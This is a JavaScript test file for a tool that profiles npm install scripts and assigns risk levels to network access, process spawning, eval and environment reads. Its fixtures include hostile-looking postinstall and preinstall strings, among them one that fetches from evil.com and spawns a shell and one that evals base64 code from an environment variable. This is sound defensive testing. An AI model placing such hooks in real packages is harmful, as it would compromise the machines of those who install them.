#!/usr/bin/env node
/**
 * Test: install-script capability profiler (Phase 3).
 * Covers: analyzeInstallScript (pure), fetchCapabilityProfile (mocked),
 * batchFetchCapabilityProfiles (mocked).
 */

import {
  analyzeInstallScript,
  fetchCapabilityProfile,
  batchFetchCapabilityProfiles,
  __internal,
} from '../src/shared/installScriptAnalyzer.js';

const { calculateRiskLevel, collectInstallScriptBodies } = __internal;

let passed = 0;
let failed = 0;

function assert(desc, actual, expected) {
  const ok = JSON.stringify(actual) === JSON.stringify(expected);
  if (ok) {
    console.log(`  ✅ ${desc}`);
    passed++;
  } else {
    console.error(`  ❌ ${desc}`);
    console.error(`     Expected: ${JSON.stringify(expected)}`);
    console.error(`     Got:      ${JSON.stringify(actual)}`);
    failed++;
  }
}

function assertContains(desc, arr, ...items) {
  for (const item of items) {
    if (!arr.includes(item)) {
      console.error(`  ❌ ${desc}: "${item}" not found in ${JSON.stringify(arr)}`);
      failed++;
      return;
    }
  }
  console.log(`  ✅ ${desc}`);
  passed++;
}

// ---------------------------------------------------------------------------
console.log('\n=== collectInstallScriptBodies ===');

const scripts1 = {
  postinstall: 'node scripts/install.js',
  preinstall: 'echo "pre"',
  test: 'jest',
  build: 'webpack',
};
const body1 = collectInstallScriptBodies(scripts1);
assert('collects postinstall + preinstall, skips test/build',
  body1.includes('node scripts/install.js') && body1.includes('echo "pre"') && !body1.includes('jest'),
  true,
);

assert('empty scripts returns empty string', collectInstallScriptBodies({}), '');
assert('null scripts returns empty string', collectInstallScriptBodies(null), '');

// ---------------------------------------------------------------------------
console.log('\n=== calculateRiskLevel ===');

assert('empty caps → none', calculateRiskLevel(new Set()), 'none');
assert('native-binary only → low', calculateRiskLevel(new Set(['native-binary'])), 'low');
assert('env-access only → low', calculateRiskLevel(new Set(['env-access'])), 'low');
assert('file-write only → low', calculateRiskLevel(new Set(['file-write'])), 'low');
assert('network-fetch only → medium', calculateRiskLevel(new Set(['network-fetch'])), 'medium');
assert('child-process only → medium', calculateRiskLevel(new Set(['child-process'])), 'medium');
assert('network+child → high', calculateRiskLevel(new Set(['network-fetch', 'child-process'])), 'high');
assert('eval-exec alone → high', calculateRiskLevel(new Set(['eval-exec'])), 'high');
assert('eval+network+child → high', calculateRiskLevel(new Set(['eval-exec', 'network-fetch', 'child-process'])), 'high');

// ---------------------------------------------------------------------------
console.log('\n=== analyzeInstallScript ===');

// No-risk package (no install hooks)
const clean = analyzeInstallScript({ name: 'clean-pkg', version: '1.0.0', scripts: { start: 'node index.js' } });
assert('clean package: no capabilities', clean.capabilities, []);
assert('clean package: riskLevel=none', clean.riskLevel, 'none');

// Native binary (node-gyp)
const nativePkg = analyzeInstallScript({
  name: 'native-pkg',
  version: '1.0.0',
  scripts: { install: 'node-pre-gyp install --fallback-to-build' },
});
assertContains('native-binary detected', nativePkg.capabilities, 'native-binary');
assert('native-binary → riskLevel=low', nativePkg.riskLevel, 'low');

// Network fetch in postinstall
const networkPkg = analyzeInstallScript({
  name: 'net-pkg',
  version: '1.0.0',
  scripts: { postinstall: 'node -e "const https = require(\'https\'); https.get(\'https://example.com\', () => {})"' },
});
assertContains('network-fetch detected', networkPkg.capabilities, 'network-fetch');
assert('network-fetch → riskLevel=medium', networkPkg.riskLevel, 'medium');

// Exec in postinstall
const execPkg = analyzeInstallScript({
  name: 'exec-pkg',
  version: '1.0.0',
  scripts: { postinstall: 'node -e "const { exec } = require(\'child_process\'); exec(\'id\')"' },
});
assertContains('child-process detected', execPkg.capabilities, 'child-process');
assert('child-process → riskLevel=medium', execPkg.riskLevel, 'medium');

// The dangerous combo: network + child_process
const dangerousPkg = analyzeInstallScript({
  name: 'dangerous-pkg',
  version: '1.0.0',
  scripts: {
    postinstall: "node -e \"const https = require('https'); const { exec } = require('child_process'); https.get('https://evil.com', r => exec('sh'))\"",
  },
});
assertContains('dangerous: network-fetch detected', dangerousPkg.capabilities, 'network-fetch');
assertContains('dangerous: child-process detected', dangerousPkg.capabilities, 'child-process');
assert('network+child → riskLevel=high', dangerousPkg.riskLevel, 'high');

// Eval
const evalPkg = analyzeInstallScript({
  name: 'eval-pkg',
  version: '1.0.0',
  scripts: { preinstall: 'node -e "eval(Buffer.from(process.env.CMD, \'base64\').toString())"' },
});
assertContains('eval-exec detected', evalPkg.capabilities, 'eval-exec');
assertContains('env-access detected', evalPkg.capabilities, 'env-access');
assert('eval → riskLevel=high', evalPkg.riskLevel, 'high');

// Raw JSON string input
const rawJson = analyzeInstallScript(JSON.stringify({
  name: 'json-pkg', version: '1.0.0',
  scripts: { postinstall: 'node-gyp build' },
}));
assertContains('raw JSON string: native-binary', rawJson.capabilities, 'native-binary');

// Garbage input
const garbage = analyzeInstallScript('not json at all');
assert('garbage input: no capabilities', garbage.capabilities, []);
assert('garbage input: riskLevel=none', garbage.riskLevel, 'none');

const nullInput = analyzeInstallScript(null);
assert('null input: riskLevel=none', nullInput.riskLevel, 'none');

// ---------------------------------------------------------------------------
console.log('\n=== fetchCapabilityProfile (mocked) ===');

const mockFetch = async (url) => {
  if (url.includes('sharp')) {
    return {
      ok: true,
      json: async () => ({
        name: 'sharp', version: '0.32.0',
        scripts: { install: 'node-pre-gyp install --fallback-to-build' },
      }),
    };
  }
  if (url.includes('event-stream')) {
    return {
      ok: true,
      json: async () => ({
        name: 'event-stream', version: '3.3.6',
        scripts: {
          postinstall: "node -e \"var r=require,t=r('fs');t.write(process.env.npm_package_description,r('crypto').pseudoRandomBytes(20))\"",
        },
      }),
    };
  }
  return { ok: false, status: 404, json: async () => ({}) };
};

const sharpProfile = await fetchCapabilityProfile('sharp', '0.32.0', { fetchImpl: mockFetch });
assertContains('sharp: native-binary detected', sharpProfile.capabilities, 'native-binary');
assert('sharp: riskLevel=low', sharpProfile.riskLevel, 'low');

const eventStreamProfile = await fetchCapabilityProfile('event-stream', '3.3.6', { fetchImpl: mockFetch });
assertContains('event-stream: env-access detected', eventStreamProfile.capabilities, 'env-access');

// 404 → null
const notFound = await fetchCapabilityProfile('not-on-npm', '1.0.0', { fetchImpl: mockFetch });
assert('404 returns null', notFound, null);

// Cache: second call should return same result
const sharpProfile2 = await fetchCapabilityProfile('sharp', '0.32.0', { fetchImpl: mockFetch });
assert('cache hit returns same capabilities', sharpProfile2.capabilities, sharpProfile.capabilities);

// ---------------------------------------------------------------------------
console.log('\n=== batchFetchCapabilityProfiles (mocked) ===');

const batch = await batchFetchCapabilityProfiles(
  [
    { name: 'sharp', version: '0.32.0' },
    { name: 'event-stream', version: '3.3.6' },
    { name: 'not-on-npm', version: '1.0.0' },
  ],
  { fetchImpl: mockFetch, concurrency: 2 },
);

assert('batch: 3 keys in result', batch.size, 3);
assertContains('batch: sharp has native-binary', batch.get('sharp@0.32.0').capabilities, 'native-binary');
assert('batch: not-on-npm is null', batch.get('not-on-npm@1.0.0'), null);

// Empty input
const emptyBatch = await batchFetchCapabilityProfiles([], { fetchImpl: mockFetch });
assert('empty batch returns empty Map', emptyBatch.size, 0);

// ---------------------------------------------------------------------------
console.log(`\n${'='.repeat(50)}`);
console.log(`Results: ${passed} passed, ${failed} failed`);
if (failed > 0) process.exit(1);
